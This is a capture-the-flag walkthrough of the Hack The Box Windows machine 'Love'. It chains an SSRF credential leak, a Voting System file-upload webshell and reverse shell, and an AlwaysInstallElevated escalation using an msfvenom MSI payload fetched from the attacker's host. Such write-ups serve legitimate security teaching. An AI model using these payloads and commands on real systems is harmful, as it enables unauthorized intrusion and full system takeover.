---
maquina: "Love"
dificultad: "Easy"
os: "Windows"
plataforma: "htb"
release: "01 May 2021"
retire: "07 Aug 2021"
creadores: "pwnmeow"
htb_url: "https://hackthebox.com/machines/love"
app_url: "https://app.hackthebox.com/machines/344"
url: "https://0xdf.gitlab.io/2021/08/07/htb-love.html"
tipo: "htb"
en_lista_oscp: false
oscp_seccion: ""
---

Love was a solid easy-difficulty Windows box, with three stages. First, I’ll use a simple SSRF to get access to a webpage that is only allowed to be viewed from localhost that leaks credentials for a Voting System instance. Then, I’ll exploit an upload vulnerability in Voting System to get RCE, showing both using the searchsploit script and manual exploitation. Finally, I’ll abuse the AlwaysInstallElevated setting to get a system shell.

## Recon

### nmap

`nmap` found many open TCP ports, as is not uncommon for a Windows host:

```console
oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.239
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-20 17:38 EDT
Nmap scan report for 10.10.10.239
Host is up (0.24s latency).
Not shown: 65516 closed ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
5000/tcp  open  upnp
5040/tcp  open  unknown
5985/tcp  open  wsman
5986/tcp  open  wsmans
7680/tcp  open  pando-pub
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 152.37 seconds

oxdf@parrot$ nmap -p 80,135,139,443,445,3306,5000,5040,5985,5986,7680 -sCV -oA scans/nmap-tcpscripts 10.10.10.239
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-20 17:44 EDT
Nmap scan report for 10.10.10.239
Host is up (0.12s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServer, X11Probe:
|_    Host '10.10.14.6' is not allowed to connect to this MariaDB server
5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp open  unknown
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
|_ssl-date: 2021-07-20T22:13:09+00:00; +26m00s from scanner time.
| tls-alpn:
|_  http/1.1
7680/tcp open  pando-pub?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=7%D=7/20%Time=60F743B8%P=x86_64-pc-linux-gnu%r(HT
...[snip]...
SF:'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20
SF:server");
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 25m59s, deviation: 0s, median: 25m59s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-07-20T22:12:54
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.43 seconds
```

I can’t glean much about the OS other than that it’s Windows. Probably a good guess that it’s Windows 10. It’s running Apache.

There’s a bunch of ports to enumerate:

- HTTP/HTTPS on 80, 443, and 5000.
- SMB/RPC on 135/139/445.
- MySQL on 3306.
- WinRM is available if I find creds.
- Unknown services on 5040 and 7680.

### SMB - TCP 445

I’m not able to get a guest session with SMB:

```console
oxdf@parrot$ smbmap -H 10.10.10.239 -u 0xdf -p 0xdf
[!] Authentication error on 10.10.10.239
oxdf@parrot$ smbclient -N -L //10.10.10.239
session setup failed: NT_STATUS_ACCESS_DENIED
```

I’ll have to come back if I find creds.

### MySQL - TCP 3306

Connections from my IP are not allowed to MySQL:

```console
oxdf@parrot$ mysql -h 10.10.10.239
ERROR 1130 (HY000): Host '10.10.14.6' is not allowed to connect to this MariaDB server
```

### Unknown Ports - TCP 5080 and 7680

I wasn’t able to get anything useful out of 5080 or 7680:

```console
oxdf@parrot$ curl 10.10.10.239:5080
curl: (7) Failed to connect to 10.10.10.239 port 5080: Connection refused
oxdf@parrot$ nc 10.10.10.239 5080
(UNKNOWN) [10.10.10.239] 5080 (?) : Connection refused
oxdf@parrot$ curl 10.10.10.239:7680
curl: (52) Empty reply from server
oxdf@parrot$ nc 10.10.10.239 7680

sadf
asdf
sadf
^C
```

### HTTPS - TCP 443

#### Site

The site just returns a 403 forbidden:

![image-20210720203033238](https://0xdfimages.gitlab.io/img/image-20210720203033238.png)

#### Tech Stack

The HTTP headers show the server is hosting PHP:

```http
HTTP/1.1 403 Forbidden
Date: Tue, 20 Jul 2021 22:27:57 GMT
Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
Content-Length: 303
Connection: close
Content-Type: text/html; charset=iso-8859-1
```

The TLS certificate shows the domain `love.htb` and `staging.love.htb`:

![image-20210720203317276](https://0xdfimages.gitlab.io/img/image-20210720203317276.png)

There’s an email address for roy@love.htb. I’ll add both domains to `/etc/hosts`:

```plaintext
10.10.10.239 love.htb staging.love.htb
```

Visiting the page by either name doesn’t change the result.

### HTTP - TCP 5000

The server on 5000 returns Forbidden as well:

![image-20210720203645843](https://0xdfimages.gitlab.io/img/image-20210720203645843.png)

### HTTP - TCP 80

#### Site

Both by IP and love.htb, the page returns a login form for a voting system:

![image-20210720203839317](https://0xdfimages.gitlab.io/img/image-20210720203839317.png)

The page title is “Voting System using PHP”.

Some basic password guessing didn’t lead anywhere. No matter what I entered, it returned:

![image-20210720203944767](https://0xdfimages.gitlab.io/img/image-20210720203944767.png)

There’s the potential that if I can guess an ID, it would give a different error about the password being off, but I couldn’t get it.

The password submissions POST to `/login.php`, and failed attempts return 302 redirects back to `/index.php`.

Basic SQL injections didn’t lead anywhere either.

#### Searchsploit

While this looks potentially like an application developed for HTB, it actually isn’t. `searchsploit` returns three results:

```console
oxdf@parrot$ searchsploit "voting system"
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Online Voting System - Authentication Bypass  | php/webapps/43967.py
Online Voting System Project in PHP - 'userna | multiple/webapps/49159.txt
Voting System 1.0 - File Upload RCE (Authenti | php/webapps/49445.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```

The third one seems like a potential match, but it’s authenticated RCE, so I’ll come back once I have creds.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP. I’ll also use an all-lowercase wordlist since it’s a Windows host:

```console
oxdf@parrot$ feroxbuster -u http://love.htb -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://love.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       30w      329c http://love.htb/admin
301        9l       30w      328c http://love.htb/dist
302        0l        0w        0c http://love.htb/preview.php
403        9l       30w      298c http://love.htb/prn
403        9l       30w      298c http://love.htb/prn.php
301        9l       30w      331c http://love.htb/dist/js
301        9l       30w      329c http://love.htb/tcpdf
301        9l       30w      330c http://love.htb/images
302      490l     1277w        0c http://love.htb/admin/positions.php
403        9l       30w      298c http://love.htb/admin/prn
403        9l       30w      298c http://love.htb/admin/prn.php
302        0l        0w        0c http://love.htb/login.php
...[snip]...
403        9l       30w      298c http://love.htb/dist/img/credit/aux.php
[####################] - 7m    637992/637992  0s      found:57      errors:192216
[####################] - 4m     53166/53166   196/s   http://love.htb
[####################] - 4m     53166/53166   202/s   http://love.htb/admin
[####################] - 4m     53166/53166   206/s   http://love.htb/dist
[####################] - 4m     53166/53166   185/s   http://love.htb/dist/js
[####################] - 4m     53166/53166   181/s   http://love.htb/tcpdf
[####################] - 3m     53166/53166   238/s   http://love.htb/images
[####################] - 3m     53166/53166   255/s   http://love.htb/tcpdf/fonts
[####################] - 3m     53166/53166   261/s   http://love.htb/tcpdf/include
[####################] - 3m     53166/53166   239/s   http://love.htb/tcpdf/config
[####################] - 3m     53166/53166   290/s   http://love.htb/dist/img
[####################] - 1m     53166/53166   643/s   http://love.htb/includes
[####################] - 2m     53166/53166   297/s   http://love.htb/dist/img/credit
```

It returned a bunch of 403 forbiddens, and 301/302 redirects. I am most interested in `/admin`. Visiting presents another login form:

![image-20210721142118090](https://0xdfimages.gitlab.io/img/image-20210721142118090.png)

This form is looking for a username instead of an id. I can enumerate users, as when I enter 0xdf as the user and a bad password, it returns:

![image-20210721142203338](https://0xdfimages.gitlab.io/img/image-20210721142203338.png)

When I enter admin:

![image-20210721142218201](https://0xdfimages.gitlab.io/img/image-20210721142218201.png)

Clearly admin is a valid username. If I can’t find anything else, I can come back and check for more.

### staging.love.htb - TCP 80

The staging.love.htb website is different. It’s a file scanning application:

![image-20210720204420614](https://0xdfimages.gitlab.io/img/image-20210720204420614.png)

In the nav bar at the top, Home leads to this page, but Demo goes to `/beta.php`, where there’s a form that takes a url:

![image-20210720205524084](https://0xdfimages.gitlab.io/img/image-20210720205524084.png)

If I start a Python webserver and enter a url hosted on my IP, it does make a request to my server:

```console
oxdf@parrot$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.239 - - [20/Jul/2021 20:56:20] "GET /test HTTP/1.1" 404 -
```

The resulting page is contains the result:

![image-20210720205710441](https://0xdfimages.gitlab.io/img/image-20210720205710441.png)

## Shell as phoebe

### SSRF

Getting the server to make a request and potentially access something I can’t access otherwise is known as a server-side request forgery (SSRF) exploit. While typically they are a bit more well disguised than a site that asks for for the url, using this to access things I shouldn’t have access to is SSRF all the same.

I tried entering `https://127.0.0.1`, but nothing returned. However, when I checked the service on 5000 by entering `http://127.0.0.1:5000`:

![image-20210721141907134](https://0xdfimages.gitlab.io/img/image-20210721141907134.png)

It seems to be giving creds for the Voting System, and they work.

### RCE via Searchsploit Script

#### Initial Failure

Having identified an authenticated RCE exploit in Voting System earlier in searchsploit, and now creds, ‘ll give that a try. `searchsploit -m php/webapps/49445.py` will copy it to my current working directory. It’s a Python script. At the top there’s some config info to update:

```python
# --- Edit your settings here ----
IP = "love.htb" # Website's URL
USERNAME = "admin" #Auth username
PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password
REV_IP = "10.10.14.6" # Reverse shell IP
REV_PORT = "443" # Reverse port
# --------------------------------
```

I ran the exploit, and nothing happened:

```console
oxdf@parrot$ python 49445.py
Start a NC listener on the port you choose above and run...
```

#### Troubleshooting

Looking at the Python script, it is using `requests` to send HTTP requests to the website. At the start, it creates a session, which will hold things like cookies to enable things like logging in. It stores it in the global variable `s`. I’ll add Burp as a proxy to that session so that I can see the requests it is sending and potentially see what’s wrong:

```python
s = requests.Session()
s.proxies = {'http': 'http://127.0.0.1:8080'}
```

On running the script again, I see three requests, all of which are returning 404:

![image-20210721143836401](https://0xdfimages.gitlab.io/img/image-20210721143836401.png)

It’s not finding any of those pages. Above, I found the admin login page at `/admin/login.php`, but for some reason this script is adding `/votingsystem` before that. Right under where I configured the settings, there’s a handful of URLs defined:

```python
INDEX_PAGE = f"http://{IP}/votingsystem/admin/index.php"
LOGIN_URL = f"http://{IP}/votingsystem/admin/login.php"
VOTE_URL = f"http://{IP}/votingsystem/admin/voters_add.php"
CALL_SHELL = f"http://{IP}/votingsystem/images/shell.php"
```

I’ll remove `/votingsystem` from each and save the script.

#### Success

With `nc` still listening on TCP 443 (with `rlwrap` to make the Windows shell better), I’ll run the updated script:

```console
oxdf@parrot$ python 49445.py
Start a NC listener on the port you choose above and run...
Logged in
Poc sent successfully
```

It hangs there, but then there’s a connection to `nc` with a shell:

```console
oxdf@parrot$ rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.239] 56061
b374k shell : connected

Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\omrs\images>whoami
love\phoebe
```

And I can grab the first flag from the user’s desktop:

```console
C:\Users\Phoebe\Desktop>type user.txt
69e87892************************
```

### RCE Manually

Once logged in, there’s not a ton to see:

![image-20210721150016714](https://0xdfimages.gitlab.io/img/image-20210721150016714.png)

Clicking around the panels didn’t lead to anything interesting. However, clicking on the logged in user’s name, Neovic Devierte, there’s an option to update:

![image-20210721151055335](https://0xdfimages.gitlab.io/img/image-20210721151055335.png)

Clicking that brings up a form to update the admin profile:

![image-20210721151126213](https://0xdfimages.gitlab.io/img/image-20210721151126213.png)

The profile picture is the first target that comes to mind, as it’s the chance to upload something. It looks like zero filtering is in place, as if I just select a simple PHP webshell and upload it as `cmd.php`, it doesn’t complain.

```php
<?php system($_REQUEST["cmd"]); ?>
```

The image is now broken at the top:

![image-20210721151521100](https://0xdfimages.gitlab.io/img/image-20210721151521100.png)

Looking at the source for the page, it saved the file as `cmd.php`:

![image-20210721151547209](https://0xdfimages.gitlab.io/img/image-20210721151547209.png)

Visiting `http://love.htb/images/cmd.php` returns an error about missing `cmd`:

![image-20210721151626831](https://0xdfimages.gitlab.io/img/image-20210721151626831.png)

Adding `?cmd=whoami` to the end shows I have execution:

![image-20210721151651843](https://0xdfimages.gitlab.io/img/image-20210721151651843.png)

To get a shell from here, I could use a PHP reverse shell, or upload `nc.exe` or a [Nishang](https://github.com/samratashok/nishang) PowerShell shell.

## Shell as SYSTEM

### Enumeration

After looking around the filesystem a bit manually, I opted to run [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS). After cloning the repo to my VM, I went into the directory with `winPEAS.exe` and started a Python web server (`python3 -m http.server 80`).

From Love, I’ll use `PowerShell` to upload the file:

```console
C:\ProgramData>powershell wget http://10.10.14.6/winPEAS.exe -outfile wp.exe
```

There’s a hit on the webserver, and the file is present. Now I’ll run it with `.\wp.exe`. There’s a ton of output, so I’ll just highlight the interesting parts.

It finds a PowerShell history file:

```plaintext
  [+] PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.19041.1
    Transcription Settings:
    Module Logging Settings:
    Scriptblock Logging Settings:
    PS history file: C:\Users\Phoebe\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 51B
```

Being able to create directories at the `C:\` root is interesting.

```plaintext
  [+] Drives Information
   [?] Remember that you should search more info inside the other drives
    C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 3 GB)(Permissions: Authenticated Users [AppendData/CreateDirectories])
```

That’s not exploitable on it’s own, but enables others.

`AlwaysInstallElevated` is set to 1:

```plaintext
  [+] Checking AlwaysInstallElevated
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```

This is bad, and is almost certainly exploitable.

There are some unquoted service paths with spaces in them. If I can restart those services, I could potentially hijack them.

### AlwaysInstallElevated

These registry keys tell windows that a user of any privilege can install `.msi` files are NT AUTHORITY\SYSTEM. So all I need to do is create a malicious `.msi` file, and run it.

I’ll use `msfvenon` to create the MSI installer. I did show this process manually for [Ethereal](https://0xdf.gitlab.io/2019/03/09/htb-ethereal.html#create-msi), but it’s a painful process, and `msfvenom` will work here. I’ll use a reverse shell payload that I can catch with `nc`:

```console
oxdf@parrot$ msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f msi -o rev.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: rev.msi
```

I’ll upload it just like I did with WinPEAS:

```console
C:\ProgramData>powershell wget http://10.10.14.6/rev.msi -outfile rev.msi
```

This requests the file from my Python webserver (now running out of my love directory) and fetches the MSI.

Now I just need to run it with `msiexec`:

```console
C:\ProgramData>msiexec /quiet /qn /i rev.msi
```

This returns nothing, but there’s a shell at my listening `nc`:

```console
oxdf@parrot$ rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.239] 61878
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
nt authority\system
```

I can grab the root flag from the administrator’s desktop:

```console
C:\Users\Administrator\Desktop>type root.txt
82f9ddad************************
```
